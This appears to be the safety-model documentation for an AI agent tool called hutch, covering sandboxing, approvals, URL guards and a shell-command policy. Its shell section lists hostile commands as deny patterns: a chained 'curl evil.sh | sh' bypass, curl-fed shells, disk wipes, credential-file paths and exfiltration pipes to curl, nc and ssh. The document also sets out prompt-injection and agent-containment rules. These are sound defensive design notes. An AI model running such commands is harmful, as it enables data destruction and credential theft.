# Safety model

Reference facts are proposed data, never instructions, tool permissions or verified truth. Schema v15
binds review to immutable content/scope and checks model writes against current execution fencing,
lease expiry, cancellation and terminal state. Private chat facts are not automatically shared;
legacy facts begin unreviewed. Runtime retrieval excludes unreviewed, archived and replaced versions.
JSON/reference framing reduces role confusion but does not prove a model will ignore malicious text.
Independent action policy, receipts and containment remain required. Memory off denies new runtime
reads/writes but cannot retract prior prompts; human management stays available. Credential stores
are never indexed as facts, but user/model text can contain private material and is not a secret vault.
The Bot settings JSON export includes all saved fact revisions and explicit share snapshots but excludes
transcripts, credentials, action receipts and workspace files. It is bounded and served with `no-store`,
but the downloaded file is unencrypted plaintext; fact values and review notes may be sensitive, so the
owner must review it before sharing. Archive is not permanent deletion.

hutch assumes a **supervising human** is part of the system. It is not a formal security boundary
against a determined adversary — it is a policy layer that checks what hutch's own tools are asked to
do. Each rule below traces to a reported failure class in `research/complaints.md` (individual reports,
not measured prevalence).

**What is and is not contained today** (see the live verification boundary in `realignment/ledger.md`):

| | Today |
|---|---|
| File tools (`read_file`, `write_file`, `list_files`) | path-jailed to the workspace |
| Shell tool | New bots request Linux strict mode: bubblewrap gives a private mount/PID/network namespace, private `/tmp`, writable workspace, sanitized environment and bounded resources. `web_fetch` provides checked public-page access; shell networking is unavailable in strict mode. This is shell-only containment, not a VM. Existing bots retain `off` after migration; the UI labels that choice. If strict mode is unavailable, the command fails closed. |
| `web_fetch` | the name is resolved and **every** answer must be a public address; redirects are followed by hutch and each hop re-checked; the connection is pinned to the validated address (no second lookup); credentials in URLs, internal names and every spelling of a loopback/metadata address (`[::1]`, `0x7f.0.0.1`, decimal, IPv4-mapped, NAT64, 6to4) are refused (`netguard.py`, `tests/test_netguard.py`) |
| browser | Chromium uses Hutch's loopback proxy for HTTP(S)/WebSocket traffic. The proxy freshly resolves every connection, rejects the whole answer set if any address is non-public, and connects to a checked numeric address. A local STUN fixture confirms that Hutch's Chromium does not send unproxied WebRTC UDP; plain Chromium does send to the same fixture. This checks that WebRTC setting only, not every browser protocol. Live public destinations and other non-HTTP traffic remain unverified. |
| `delegate_task` | Experimental opt-in for supervised built-in Strict Offline runs only. Each request always asks, including in auto mode. A child inherits the root's immutable permission snapshot, uses a fresh private run workspace, receives only its task text, has browser/memory tools removed, and remains attached to the same conversation for operator visibility. Depth, lifetime fan-out, steps, duration and inherited budget are bounded. Parent Stop cascades; child cleanup remains visible until verified. The current public path runs one child at a time and does not copy files into a parent workspace or prompt. No live model or external-runtime child has been verified. See `realignment/delegation.md`. |
| Outlook Mail send | Experimental Connections preview. A separate delegated `Mail.Send` account must be granted to one Bot. Each plain-text send shows exact sender account, recipients, subject and body for fresh outward approval, including auto mode. One fixed Graph request is attempted; uncertain responses stay `outcome_unknown` and are never replayed automatically. `202 Accepted` is not delivery confirmation. Live provider behavior is unverified. |
| Outlook Calendar event creation | Experimental Connections opt-in. A distinct `Calendars.ReadWrite` account and one-calendar Bot grant are required. Microsoft grants account-wide create/read/change/delete authority; Hutch exposes only guest-free creation on the selected calendar. Every complete event needs fresh exact approval, including auto mode, then readback verification. Ambiguous results remain `outcome_unknown` and are never replayed automatically. Provider consent and live Graph writes are unverified. |
| Pi/OpenCode Bot runtimes | disabled before process creation. Protocol helpers cover selected wire formats, but Hutch cannot yet broker these runtimes' permissions end to end, enforce provider budgets, or run either harness inside the owned sandbox. Selecting these runtimes fails with an actionable message; they are not supported Bot executors. |
| Reviewed OpenCode coding handoff | Experimental, owner-launched from a Linux TTY in a pinned Git worktree. `hutch code login` connects a provider through OpenCode's supported CLI picker and stores it in a dedicated private profile under Hutch state; Hutch does not import the regular OpenCode profile. The CLI task uses that profile with shell prompts and a 20-step ceiling, but Hutch does not broker permission decisions or contain commands the owner approves. Those commands have the Linux user's filesystem, process and network authority, and their usage is outside Hutch budgets. OpenCode plugin directories are refused pending upstream verification. Cleanup remains visible until process-group identity is checked; see the dated research. |
| Stopping a run | an intent recorded in the database: `hutch stop`, `stop-all` and the dashboard work on a run owned by any process. Stopping a run also marks its persisted descendants in one transaction before signaling begins; each owned attempt remains `Stopping` until its own cleanup is verified. Delegated children start only after their capability snapshot is validated and use a private per-run workspace. `serve`, `daemon`, and `hutch run` use one owned process per attempt. Recovery fences the old owner before cleanup and signals only boot/start-verified process identities through pidfds. `Stopping` or `Cleaning up` remains visible while cleanup is incomplete or cannot be verified; global/per-bot capacity stays occupied while recorded processes are unreaped even if status already became terminal; terminal cancellation waits for confirmed cleanup. |

Provider credentials stay route-specific. OpenCode Go asks the user to sign in at OpenCode and copy its issued key for
Hutch's separate Go connection. The coding handoff uses OpenCode's supported interactive provider flow in the dedicated
`opencode-profile/opencode.db` SQLite database under Hutch state; Hutch does not read, copy or export credentials from the
regular OpenCode profile or browser session. OpenCode stores the selected provider credential in its own profile database.
Sign in with ChatGPT, when the
operator explicitly enables its eligibility-gated preview, uses OpenAI's local PKCE/OIDC flow and fixed Responses API
route. OAuth credentials are kept in a private file under Hutch's state directory, are not returned to the UI/API,
and are sent only to OpenAI. ChatGPT plan allowance is provider-controlled; Hutch cannot enforce an output-token cap
on this preview route. Neither integration shares browser cookies or credentials from another client.

Scheduled and coordinator-assigned work may use a ChatGPT plan only after the owner grants permission for that Bot and
account. The permission is tied to the Bot's current provider routes, stored in Hutch's local database, and checked again
before each provider request so a revoked or stale grant cannot authorize a later call. An in-flight request may finish;
subsequent requests stop. Disconnecting the account removes its grants. These controls do not change the preview's
eligibility boundary or make Hutch's estimated output limits provider-enforced.

Bots start with a fresh workspace for every run. The optional Hutch-managed mode reuses a private, 0700 folder for one bot across its
runs and conversations; the existing-folder mode is explicit and validated. Files never move automatically when a mode changes. Deleting
a bot preserves its managed workspace, and database snapshots do not include managed workspaces or user folders; back them up separately.

The realignment ledger records which behavior is tested, which is only documented, and which requires live provider or device access.

## Response style does not set authority

Response-style preferences are stored with Hutch's local assistant and conversation state. A next-reply override is held
in the current browser's local storage and is removed after its message is submitted or the owner clears it. When a run
starts, Hutch snapshots the resolved style into that run; changing settings later does not rewrite an in-flight prompt.
The style snapshot can appear in the normal run record. When a message is sent to a hosted provider, its response-style
instructions are part of the provider request and follow that provider route's data-handling terms.

Presets and customization affect wording only. They cannot enable tools, skip approvals, change risk tier, spend limits,
grounding needs, sources, recipients, code requirements, requested JSON/file formats, or action review. A shorter answer
must still include information needed to act safely and correctly. Humor is not newly enabled for a sensitive or
consequential topic, and an immediate correction or withdrawal of playful consent applies to the current turn. These are
prompt and routing controls rather than a guarantee that every provider model will follow them; tool policy, approvals and
output validation remain authoritative. Live preview is an explicit one-response request on the assistant's configured
built-in route. Its fixed fictional prompt excludes conversation history, standing directions, workspace and tools; it
shows a local cost estimate, enforces a 128-token maximum output cap (or the assistant's lower configured cap), and does
not retry, fall back, or escalate. Hutch blocks it when that cap or a hosted model's price cannot be verified. A preview
is recorded as a standalone local run and is not saved as a preference. This workflow has been verified with a fixture
runtime and request-contract tests, but real model quality and provider adherence remain unverified. Its redacted
inspector exposes only resolved preview scope/revision, safe adapter request-shape metadata and measured call/queue time;
prompt/response content, credentials, account details, endpoints and hidden reasoning are omitted. The adapter record
means the request was serialized by Hutch; it does not confirm provider receipt or acceptance.

Shorter, go-deeper and less-banter rewrites attach to one explicitly selected assistant message. Hutch accepts a target
only when its source run succeeded and the request and answer are available in the same conversation; pending questions,
failed runs, oversized answers and cross-conversation references are rejected. The bounded source request and answer are
sent as untrusted data to the configured provider for the rewrite. The rewrite uses the built-in tool-free runtime,
omits workspace and pending-action context, rejects provider tool calls, and cannot repeat an external action. It is a
new provider request, so hosted-provider retention terms still apply. A rewrite changes only the new reply text: it does
not undo the source run's effects or turn a prior statement into fresh evidence. Its prompt guidance asks the model to
preserve citations, uncertainty, caveats and output contracts, but live provider adherence remains unverified.

In chat, Shorter, Go deeper and Less banter appear only below a completed answer from the built-in runtime. The
buttons target that answer explicitly and start a new tool-free response; they do not repeat tools or external
actions. Failed, pending-choice, oversized and non-built-in answers do not offer these controls. Browser checks
confirm that using a correction preserves the composer draft and selection and keeps the reader's scroll position.
Changing persona controls alone does not send a request; choosing **Preview this draft** explicitly sends the fixed
sample and candidate style to the configured model, while choosing a correction explicitly sends the bounded source
request and answer as untrusted context. Saved feedback sends no request.

The local `HUTCH_ENABLE_ADAPTIVE_PERSONA=0` rollback switch disables new persona plans and style-only writes while
preserving saved profiles and any plan already captured by a run. It does not change task permissions, approval policy,
grounding requirements, or stored database repairs; settings become read-only until the operator re-enables the flag.

Helpful/Needs work feedback is a separate local record for a completed answer. It uses a fixed rating and optional
fixed reason list, contains no free text, calls no provider, and never changes a saved response style or trains a
model. Revision checks prevent one tab from silently overwriting another. Conversation exports omit this metadata;
the built-in chat hides feedback controls for disabled external runtimes. See [response-style help](response-style.md)
for the local-storage and export scope.

Worker review requests, wait state and inline review events commit together. Canonical decision
summaries override stale transcript asks after a worker crash. Schema v11 resource replay
contains identifiers rather than message, argument or secret content; clients fetch current
resources and preserve draft/focus during refresh. Gaps require snapshot reconciliation, and
restored histories need epoch rotation. Schema v12 delivers JSONL through a separate recoverable
queue, verifies canonical prefixes and retains damaged files before reconstruction. Errors stay
visible; SQLite remains the canonical transcript source. FULL WAL synchronization precedes
acknowledgement of action prerequisites, subject to storage honoring fsync. See
[operations](operations.md), [ADR-0012](adr/0012-resource-outbox-and-reconciliation.md) and
[ADR-0013](adr/0013-recoverable-transcript-files.md).

Schema v16 batches transcript-delivery intent updates with the canonical event transaction. It
removes per-event trigger work while retaining recoverable delivery, hash verification and visible
failures; it does not make the filesystem mirror authoritative.

Schema v13 records immutable tool arguments and reviewed authority before effects. Missing
receipts seal atomically as uncertain even when the runtime returns success. Check the destination
and record an outcome in chat or Needs you; this is an immutable human report, not independent
verification or permission to replay. Matching uncertain effects in the same conversation require
reconciliation. Legacy arguments remain unknown, and original statuses/events are preserved.
Saved intent may contain private user material; keep the state directory private. See
[ADR-0014](adr/0014-immutable-action-review.md).

Provider account/destination changes require per-run outward approval. The exact route and
revision are checked again before provider creation; cached clients cannot retain a removed or
rotated connection key. Generic hosted sticky grants and the old legacy key-routing escape
cannot bypass that boundary. Streaming recovery reserves each attempt separately, retaining
uncertain first usage. These are fixture-tested controls, not live billing certification.

Google Calendar stays read-only unless the owner separately requests `calendar.events.owned` and
grants one Bot one account-owned calendar. Google says this scope can also change and delete events
on every calendar the account owns; Hutch only offers guest-free creation on the selected calendar.
Each exact event still requires outward approval even in auto mode, and the grant is rechecked after
approval. Hutch reads the returned event ID back and verifies the title, time instants, description and
location before reporting success. An uncertain write or failed readback remains unreplayed; the owner must check the calendar
before attempting another event. Consent and provider requests have fixture-only coverage.

Outlook Mail sending is a distinct delegated `Mail.Send` grant, never implied by `Mail.Read`. Hutch
shows the exact plain-text message and destination for a fresh outward approval on every send. It
makes one Graph request and never automatically retries transport/server ambiguity; those receipts
remain uncertain until the owner checks Outlook Sent Items. Microsoft `202 Accepted` is not proof of
delivery. Reply, forward, attachment, CC and BCC operations are unavailable. The credential remains
outside SQLite in Linux Secret Service, and disconnect removes Hutch's local grant/token; provider
consent must be revoked separately. This fixture-covered Connections preview has not been tested
against a real Microsoft tenant.

Outlook Calendar event creation uses a separate delegated `Calendars.ReadWrite` sign-in, not the
read-only calendar credential. Microsoft permits this scope to create, read, change and delete events
across the signed-in account's calendars. Hutch's per-Bot grant narrows its own action to creating a
guest-free event on one selected calendar; it cannot narrow the provider's consent. The owner sees the
complete event and account/calendar in a fresh approval every time, even in automatic mode. Hutch
submits once, then verifies the event by reading it back. Missing or mismatched verification stays
`outcome_unknown`; reconcile in Outlook before any manual retry. No live account or Graph write has
been tested.

Explicit extra read-only shell mounts are installed after private temporary mounts and the
writable workspace so the declared mode survives execution. Credential descendants, symlinks
outside the granted folder, unreadable trees and grants covering the workspace are refused;
inspection is capped at 10,000 entries, with a narrower-folder error on exhaustion. These are
launch-time checks on operator-owned configuration, not a filesystem watcher.

## The three verdicts

Every action is classified **allow** (runs silently), **ask** (pauses for a human), or
**deny** (refused, logged, never executed).

### Shell commands

The line is read the way a shell reads it **before** any rule is matched, and every place a command can hide is
analysed, because the chained-command allowlist bypass (`git status && curl evil.sh | sh`) that lived for a year in a
popular agent is only the simplest member of a family. Each segment is classified; the worst verdict wins.

| Where a command can hide | Handled |
|---|---|
| after `&&`, `\|\|`, `;`, `\|`, `\|&`, a bare `&`, or a newline | each is a separator |
| command substitution `$(...)` and backticks, **including inside double quotes** | the inner command is analysed recursively |
| process substitution `<(...)` / `>(...)`, subshells `( ... )`, groups `{ ...; }` | read as their contents |
| `bash -c '...'`, `sh -c`, `eval '...'` | the string is analysed as a command line |
| `env`, `nohup`, `timeout`, `nice`, `time`, `command`, `exec`, `xargs`, `watch`, ... | the wrapped command is analysed |
| `find ... -exec cmd {} \;` and `find ... -delete` | the payload is analysed; `-delete` asks |
| here-documents | the body is data, **unless the delimiter is unquoted**, when `$(...)` inside it runs |
| a program name chosen at run time (`$(echo sudo) ls`, `${SH} x`, `~/bin/x`, `./*.sh`) | denied: cannot be checked |
| `sh -c "$(curl ...)"`, `bash <(curl ...)`, `source <(...)` fed by the network | denied: runs downloaded content |
| redirects (`>`, `>>`, `&>`) to `/etc/x`, `~/x`, `$HOME/x`, `../x`, `/tmp/x` | denied: writes outside the workspace |
| an unterminated quote or substitution, a stray parenthesis, an oversized or too deeply nested line | denied: "could not check this command safely" |

The parser is a conservative reader, not a shell: it never expands anything, it only has to find every place a command
can hide, and **when it cannot read a line with confidence it denies**. `$(( x + 1 ))` stays arithmetic; `$(( sudo ls ))`
(which bash may read as a subshell) is analysed as a command. It is fuzzed (`tests/test_shellparse.py`): random
combinations of up to three nesting contexts around hard-denied, ask-class and benign commands must keep every
hard-deny denied (also under `trusted` and an `allow: *` rule), never turn an ask into an allow, never block a benign
command, and no input of any shape may make the analyser raise.

**Hard-denied classes** (never executable, regardless of sticky allows or `auto` mode):

| Class | Examples |
|---|---|
| Privilege escalation | `sudo`, `su`, `doas`, `pkexec`, `visudo` |
| Escapes & wipes | `rm -rf /`, `~`, `$HOME`, `..`; `dd`, `shred`, `mkfs*`, `fdisk`, `parted`, `wipefs` |
| Power & system | `shutdown`, `reboot`, `halt`, `poweroff`, `systemctl`-adjacent power targets, `crontab`, `passwd` |
| Secrets access | any argument touching `~/.ssh`, `id_rsa`, `.env`, `~/.aws`, `~/.gnupg`, `/etc/shadow`, `.git-credentials`, `.npmrc`, `.netrc` |
| Pipe to interpreter | `… | sh`, `… | bash`, `… | python3`, `… | perl`, `… | node` |
| Exfiltration channels | `… | curl`, `… | nc`, `… | ssh` (command output piped to the network) |
| Upload flags on fetchers | `curl -X POST … -d`, `curl -T`, `wget --post-data`, pipe-input variants |
| Resource attacks | fork-bomb patterns |

**Ask** classes (approval once, sticky "always allow" available): `rm`/`mv`/`chmod`/`chown` inside
the workspace, `git push|reset|clean|checkout|rebase`, package managers, `kill`/`pkill`, `docker`,
`ssh`/`scp`/`rsync`.

### Risk tier and command rules (per bot)

Each bot has a **risk tier** and optional **command rules**. They only ever refine the **ask** zone:

| Tier | What happens to a medium-risk action (would ask) |
|---|---|
| `readonly` | blocked, with the reason "this bot is read-only" (file writes included) |
| `supervised` (default) | asks |
| `trusted` | runs without asking, **except** anything that sends data out of the machine, which still asks |

Rules are one per line, `allow: <glob>`, `ask: <glob>` or `deny: <glob>` (first match wins), matched against each
command segment, **including commands inside wrappers and substitutions** (a `deny: git push*` also stops
`nohup git push`, `bash -c 'git push'` and `echo $(git push)`). A rule can tighten any decision, or let a medium-risk
command run. Three limits are structural, not conventions, and are tested:

1. a **hard deny is final**: no rule and no tier turns secrets access, exfiltration, `sudo` or a workspace escape into
   allow or ask;
2. an **outward send always asks** (SR-4): an `allow` rule or the `trusted` tier cannot suppress it;
3. an `allow` rule on an outer command **cannot launder** a more dangerous command nested inside it.

Set them on the bot page, with `hutch bot create --risk-tier readonly --rule 'deny: git push*'` /
`hutch bot update --clear-rules`, or in the API (`risk_tier`, `command_rules`). A malformed rule is rejected naming the
line instead of silently doing nothing.

When `sandbox: strict`, a command runs in bubblewrap with `HOME` and `cwd` inside the workspace, a minimal environment, a private
temporary directory, no shell network and host-configured CPU, memory, process, file-size and open-file limits. This only covers
the shell subprocess. `sandbox: off` is explicitly uncontained execution as the Hutch user; it uses the same policy and timeout.

### File paths

Read/list must resolve inside the run workspace (real-path resolution, so `sub/../x` stays inside
and `../../.ssh` does not). Writes additionally require approval (sticky `files:write`).
Absolute paths outside the workspace are denied.

File-write requests persist the full proposed contents, workspace and destination revision in
their approval fingerprint. A file created or edited while a person reviews it requires a new
request. Linux writes walk directory descriptors without following symlinks, serialize Hutch
writers on the workspace, and atomically replace the file; replacing a hard link does not alter
its other names. Temporary files are removed on ordinary failure. The lock coordinates Hutch
writers, not arbitrary host applications: a hostile owner editing the directory concurrently
is outside this boundary. Reads/listing still use real-path policy and are not descriptor-based.

### URLs

`web_fetch` and the browser accept public `http(s)` only, decided on **addresses**, not spellings (`hutch/netguard.py`):
non-http schemes, credentials in the URL, internal names (`localhost`, `*.internal`, `*.local`), and any address that is not
public (loopback, private, link-local incl. cloud metadata, CGNAT, multicast, reserved; IPv4 embedded in IPv6 is unwrapped) are
refused, whichever way the address is written and whichever name resolves to it. Redirects are followed by hutch and every hop is
re-checked. Response bodies are hard-clipped. Chromium browser traffic uses an owned loopback proxy: for each HTTP, HTTPS or
WebSocket connection it freshly resolves the destination, rejects mixed public/private DNS answers, and connects to a numeric
validated address. HTTPS uses CONNECT, leaving TLS certificate and hostname checks in Chromium. Local Chromium fixtures cover
ordinary HTTP and a redirect where a formerly public DNS answer turns private before the next connection. Chromium also uses
`disable_non_proxied_udp`; a local STUN fixture observed UDP from default Chromium but none from Hutch's configured browser. This
only checks that WebRTC path. Traffic outside the configured HTTP proxy remains unverified except for that fixture, and live public
destinations have not been tested. A locally configured model endpoint is an explicit exception made by a connection, not by a URL
pattern.

### Browser actions

`goto` uses URL policy. `click` and ordinary `type` always ask because either can send data or buy something; sticky grants and auto mode cannot cover them. Browser `type` values are redacted from durable events and action receipts, and review binds a process-keyed fingerprint, character count, selector/label, page URL and bot profile. Native HTML form submits are identified in the approval with destination, method, submit label and visible field labels. An isolated Chromium execution world computes a digest over the current form state—including values, checkbox/selection state, submitter and its overrides—without exposing values to the page's own JavaScript hooks, Hutch records or the model. Hutch recomputes it after approval and refuses detected changes before clicking. Form submission fails closed when secure browser hashing is unavailable or the bounded review size is exceeded; selected file uploads are refused unless the separate reviewed upload action froze and verified their exact bytes and destination. The keyed target binding includes URL-scoped cookie state without exposing cookies. Managed text transfers have explicit path/MIME/size/deadline/quota checks; ordinary Chromium downloads are disabled (see [computer-use](computer-use.md#profiles-iframe-scope-and-governed-files)). This last check is not an atomic transaction with the remote website; it does not prove identities stored only in custom site state or certify the behavior of site-specific scripts after the click. Generic browser clicks continue to require outward approval. Each browser-tool instance owns a separate context and persistent profile, with an OS file lease across run workers. HTTP(S)/WebSocket connections pass through the DNS-pinning local proxy; this has only local Chromium fixture coverage and does not confine unrelated browser protocols. Headless is the default. Chromium's implicit local/link-local proxy bypass is disabled, service workers are blocked, and denied request logs retain only the origin.

Sensitive-entry protection blocks agent `type` calls on conventional password, passcode/OTP, verification-code, payment-card, and secret/token fields before browser input or durable action creation. Hutch never supports entering a password or one-time code through chat. Screenshots fail closed while a conventional sensitive field is visible. Detection uses visible labels and common DOM attributes; a custom widget or an unmarked field can evade it, so do not treat the detector as a secret vault. A bot may opt into **Local browser handoff** on a Linux desktop: Hutch opens the same isolated profile in a visible window, holds an exclusive browser-handoff/profile lease, pauses at a detected login/CAPTCHA/MFA or sensitive-field checkpoint, and tells the person to enter credentials or complete the challenge directly in that browser. Hutch does not type secrets or solve/bypass CAPTCHA. The human-needed event records a reason/origin, not the secret. Resume is tied to the current wait event; the browser is not reloaded, and the page is checked again afterward. If the challenge remains, Hutch keeps waiting. Without the setting or a usable display, a headless run returns an actionable failure instead of claiming to wait for a person. The local visible-browser path and bounded HTTP step input are verified in disposable fixtures. Physical phones, custom-field completeness, screen-reader support and live third-party challenges remain unverified.

## Rehearse (dry run)

A run started with **Rehearse** simulates the builtin tools' mutating operations. Reads and model
calls still happen; rehearsal is not a network-disconnected preview. The tools enforce simulation:

- **Reads run for real**: `read_file`, `list_files`, `web_fetch`, browser `goto`/`read`/`wait`, `recall`, and shell commands
  that are provably read-only.
- **Everything else is only described.** `write_file`, `remember`, browser `click`/`type`/`upload`/`download` and any shell
  command that is not read-only reply `[rehearsal] would ...` with the policy's verdict ("would pause for approval", or
  "would be BLOCKED: ..."), and the transcript marks the result **simulated**. A simulated action asks nobody, because
  nothing happens.
- **Read-only is an allowlist, and unsure means simulated**: `ls`, `cat`, `grep`, `find` (without `-exec`/`-delete`), `git
  status|log|diff|show`, `sort`, `wc`, `echo`, and similar, joined by pipes and `&&`. A write redirect, a background job, a
  heredoc, a wrapper (`bash -c`, `env`, `xargs`), a substitution containing a non-read-only command, `sed`, `awk`, `tee`,
  `python`, `curl` are all treated as mutating.

Limits: a rehearsal still calls the model (and so can cost money on a hosted one), and a read that has a side effect on
someone else's server (a `GET` that logs you out) still happens.

## Conversational questions

The built-in runtime offers `ask_user_choice` only when a run belongs to a conversation. It is a
chat primitive, not a Bot-granted action capability: it is absent from the tool permission list and
cannot perform or approve an external action. Questions have bounded text and 2–12 distinct
options. Hutch persists the Bot message, immutable option list and `choice_requested` event in one
owned transaction, then ends that run. The answer endpoint checks the same conversation and Bot,
validates the selected option IDs, and admits one ordinary user turn atomically. A concurrent second
answer loses; an exact retry returns its original run. The user selection adds information to the
prompt and does not change tools, permissions, account scope or approval state.

Choice questions are not `waiting_approval` or `waiting_human`: approvals govern an exact external
effect, while browser `waiting_human` is reserved for a live login, CAPTCHA, 2FA or other human-only
checkpoint. A model response that bundles a choice request with any other tool call is rejected as
a batch before sibling calls can run. Pi/OpenCode adapters do not support the chat primitive while
those external runtimes remain disabled.

## Bot-purpose drafting

The optional New Bot refinement action is available only from a built-in workspace coordinator chat. It sends the exact source
user request, the owner's editable current purpose and only earlier user messages explicitly selected from that same conversation.
The request uses a normal run and budget reservation, but the run has no tools and cannot execute actions even if the coordinator
Bot ordinarily has capabilities. The runtime does not receive the Bot's recent chat history beyond this explicit context. A model
tool call is refused without execution; truncation fails closed rather than escalating or dropping context. The coordinator may
ask one concise, choice-based question for a material missing work detail, then return an editable draft. The flow permits at most five answers. The prompt forbids questions about passwords, credentials, sign-in details, verification
codes, account access, permissions or authority. The client also rejects questions and options containing a denylisted set of these
terms; this guardrail is not a complete detector. The exact source, selected context and prior answers are untrusted data in each
bounded request. Malformed output, flagged questions, truncation or provider tool calls are not applied; tools remain unavailable
even if the coordinator normally has them. The answer text and draft stay in the same browser for up to seven days and are not
synced across devices. Setup warns owners not to enter passwords, codes or account credentials; local storage is not a credential
vault. The owner can edit the proposal; it cannot create the Bot or change its route, tools, accounts, workspace or permissions. A
separate setup review and create confirmation still follow. Model quality is fixture-tested, not live-provider verified.

## Coordinator handoffs

The workspace coordinator can prepare a specialist task only from its own completed assistant answer and the matching user
request. The coordinator's reply is a proposal, not authorization: the person chooses an existing Bot, sees that Bot's saved route,
tools, action policy and workspace mode, edits the brief and optional assumptions, and explicitly confirms before Hutch creates a
separate specialist conversation/run. Hutch atomically preserves the source request, coordinator draft, reviewed content, target
display name, child IDs and idempotency receipt. The task card remains linked from the originating coordinator turn and refreshes
with the specialist's authoritative status and latest answer.

Only the reviewed brief and assumptions enter the specialist conversation by default. During the same review, the owner may leave
all facts unselected or explicitly choose up to eight current, approved facts scoped to the coordinator Bot or this exact chat, with
a 6,000-character serialized limit. Hutch snapshots the exact values, revisions, hashes, source Bot and scopes immutably with the
task, then presents the snapshot only as untrusted context to that specialist run. It does not add those facts to the specialist's
saved memory. The coordinator's other chat history, files, memory and permissions are not copied; the specialist's own enabled
memory and workspace may still apply. The review names the specialist's saved provider route and warns that its provider may retain
the submitted context under its terms. Once the run is sent, Hutch cannot recall that copy from the provider. A coordinator follow-up can include
a specific successful specialist response only after the user selects that result and attaches it in the composer. Hutch checks
its task, parent chat, source message and successful-run status, then snapshots the exact bounded response and source Bot name.
The coordinator receives that snapshot as untrusted input; hostile markup cannot escape the wrapper. This explicit text share
transfers no files, credentials or permissions and does not happen automatically. Only Bots in the durable owner-approved specialist
roster can receive new coordinator tasks; the roster starts empty, coordinator/specialist role overlap is blocked by storage, and
removing a Bot affects future dispatch only. The child receives only the reviewed brief,
assumptions and exact optional fact snapshots; it has no other inherited conversation context and uses its own saved route. A
missing or changed route, instructions, permissions or workspace causes a
visible pre-execution failure; the task is not silently re-run under new authority. Exact retries return the same task, while the same
idempotency key with changed content conflicts. Schema v31 records a bounded task timeline derived atomically from committed
child-run events. It contains event sequence/type, run status, marker kind, recovery label, opaque decision/artifact reference,
and timestamp; it does not duplicate prompts, event text, hidden reasoning, action arguments, tool output, credentials, or paths.
Schema upgrade backfills older specialist tasks from their committed events, and checkpoint rows reject in-place edits. Removing
the owning task removes its timeline with it. The API exposes only the latest 16 markers per task plus a materialized total.
This is audit visibility, not a continuation mechanism: no
resume action exists after a process or application restart. The child run and its captured capability snapshot remain the
authority for execution history. If an external effect has an uncertain receipt, the status remains `outcome_unknown` and
requires reconciliation rather than replay. The handoff still lacks automatic sequential planning, parent-plan cancellation, or
generalized task clarification. Provider execution has not been validated live.

## Approval flow

1. A tool hits an **ask** verdict → an `ApprovalRequest` row is created; the run enters
   `waiting_approval` in the same transaction, and the dashboard/CLI show the exact action and arguments.
2. A human approves (optionally **always allow** for that bot+action-key) or denies.
3. Unanswered requests expire after **10 minutes and are recorded as expired**. Silence is never
   consent; a stopped dashboard cannot leave a bot waiting forever without that being visible.

`approval_mode: auto` skips asks (allowlist-only mode) for bots you trust — the hard-deny classes
still apply. Outward browser/provider-route actions require review even in auto mode.
An expired owner cannot create a new approval or reserve another provider call, even before recovery.
Approval arguments cannot be rewritten after admission. A decision for an expired/stopped
execution is recorded as expired and cannot grant standing permission.

Browser alerts are off until a person enables them from Needs you and grants the browser's
notification permission. While the tab is open and backgrounded, a new pending approval or
uncertain action can produce a generic notice; it contains no bot name, conversation text or action
arguments. The click opens the local review queue. This is not push delivery and cannot reach a
closed tab, sleeping host or disconnected device.

### Remote dashboard access is experimental

Hutch stays on loopback and remote access is disabled unless the operator explicitly launches `hutch serve --allow-remote` with an
exact HTTPS RP hostname/origin and allowed Host. Use Tailscale Serve with tailnet access restricted to trusted devices, or a private
LAN interface protected by a trusted certificate and firewall. Do not use a wildcard bind, Tailscale Funnel, public port forward, or
untrusted proxy. Hutch disables Uvicorn proxy rewriting and trusts forwarded HTTPS/Host/client-address metadata only from configured
exact proxy IPs.

A one-use host pairing code creates only a short enrollment cookie and permits at most 16 registration challenges. Passkey
registration/login requires user verification, then grants a separate HttpOnly, revocable session with a 30-minute idle and
eight-hour absolute limit. Synced passkeys are supported, so a
credential is not proof of one physical phone. Paired phones can monitor status/transcripts, review exact approval requests, allow
once or deny, stop/resume through current server checks, and start only when both the pairing and local Bot settings grant Start.
Owner tokens, credentials, schedules, Bot settings, device management, and computer permission settings remain local. Explicit Bot step-control permission and device Review are additionally required for bounded human input. Route authorization is
deny-by-default; unsafe requests require same-origin checks and a session-bound CSRF token. Private responses are not cacheable, and
streams check session validity while idle. An uncertain command is reconciled with its original idempotency key before retry.

The local route, passkey/session store boundaries, and actual Uvicorn HTTPS listener have automated coverage. iOS Safari, Android
Chrome, live Tailscale Serve, LAN certificate renewal, and live network isolation remain unverified; remote operation is experimental
and not production-certified. Hutch can only execute while its host is awake and connected. Authenticated bounded computer step control is locally verified; physical-phone and live-network input remain unverified. Authenticated PTY is unavailable. Local browser handoff is experimental and needs a Linux display plus
the optional Playwright browser. The marketing site cannot reach Hutch on localhost.

## The tool-call validation boundary

Every tool call, however the model produced it (provider-native protocol, backend-constrained
JSON schema, or the explicitly chosen prompt contract), arrives through one governed path:

- A call must decode strictly (no duplicate keys, `NaN`/`Infinity`, trailing text, or an empty
  argument body for a tool that declares required fields), name a registered tool exactly, and
  validate against that tool's full registered argument schema. Malformed, unknown, ambiguous,
  or schema-invalid calls are never executed; the model receives one precise repair prompt.
- Grammar constraints and structured-output modes improve the shape of generated JSON. They
  are not permissions, not evidence that the model understood the task, and they do not replace
  the deny/ask/allow rules or approvals below.
- Model output that merely *looks* like a tool call in ordinary text is never executed; a
  protocol-mismatch diagnostic is recorded instead.
- Tool results are returned as data. Neither a result nor a quoted example can become an
  executable call.
- Choosing a fallback mode cannot widen a Bot's tools, account, or permissions. `constrained`
  and `prompt` are per-Bot choices; no run silently downgrades a strict workflow, switches
  model, or changes accounts to make a call succeed.

## Honest limits (read this)

- **External runtimes** (`pi`, `opencode`) are disabled. They cannot currently satisfy Hutch's process ownership, approval,
  credential routing, sandbox and usage-reservation requirements. The builtin runtime is the only production model-backed executor;
  test scenarios are not available to application users. Builtin calls reserve estimated tokens and priced currency before a request; provider billing can differ, and
  uncertain outcomes remain held until an operator reconciles the provider record.
  Worker accounting requires current ownership, cannot change reservation identity, and cannot
  overwrite an uncertain hold. Outstanding holds do not disappear when an allowance window rolls over.
- **A supervised human is assumed.** Prompt injection can still produce plausible-but-wrong actions
  inside the allowed toolset; the transcripts, caps, and approvals bound the damage.
- **Script contents are not analysed.** `bash script.sh`, `python3 x.py` and `python3 -c '...'` run what is in them: bots
  write and run code, so this is allowed. What those scripts do is bounded by the workspace-jailed `HOME`, the minimal
  environment and the timeout, not by the parser. Commands other than `>` redirects (`cp`, `tee`, `install`, `touch`
  with an absolute path) are not path-jailed either.
